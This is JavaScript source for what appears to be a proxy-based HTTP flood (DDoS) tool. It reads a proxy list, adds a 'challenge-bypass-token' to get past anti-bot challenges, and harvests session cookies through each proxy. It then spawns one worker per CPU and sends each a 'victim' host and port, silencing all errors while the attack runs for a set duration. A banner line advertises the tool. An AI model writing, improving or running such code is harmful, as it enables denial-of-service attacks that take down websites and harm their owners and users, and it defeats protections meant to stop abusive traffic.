const privacyPass = require('./privacy.js');
const { fork } = require('child_process');
const request = require('request');
const fs = require('fs');

let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/g, '').split('\n');
console.log('Loading proxy list. - ISRAEL FOR THE WIN skids.com');

var headers = {
    'Connection': 'Keep-Alive',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3599.0 Safari/537.36',
    'Upgrade-Insecure-Requests': '1',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0'
};

var url = process.argv[2].replace(/[?](.*)=(.*?)$/g, '');

headers['challenge-bypass-token'] = privacyPass(url);

var workers = [];

let cpuCount = require('os').cpus().length;

for (let i = 0; i < cpuCount; i += 1) {
    let worker = fork('./msget.js');
    workers.push(worker);
}

process.on('uncaughtException', e => {});
process.on('uncaughtRejection', e => {});
process.on('warning', e => {});

var w = 0;
proxies.forEach(proxy => {
    var req = request.defaults({ proxy: 'http://' + proxy });
    req.get(url, (err, res) => {
        if (!res || !res.headers['set-cookie']) return;
        headers.cookie = res.headers['set-cookie'].shift().split(';').shift();
        req.get(url, {
            headers: headers
        }, (err, res) => {
            if (!res || !res.headers['set-cookie']) return;
            var cookie = headers.cookie + '; ' + res.headers['set-cookie'].shift().split(';').shift();
            let worker = workers[(w >= cpuCount) ? w++ : (w = 0)];
            worker.send({
                id: worker.id,
                proxy: proxy,
                victim: {
                    host: process.argv[2],
                    port: process.argv[3]
                },
                cookie: cookie
            });
        });
    });
});


setTimeout(() => {
    workers.forEach(worker => worker.kill('SIGINT'));
    process.exit(1);
}, process.argv[3] * 1000);
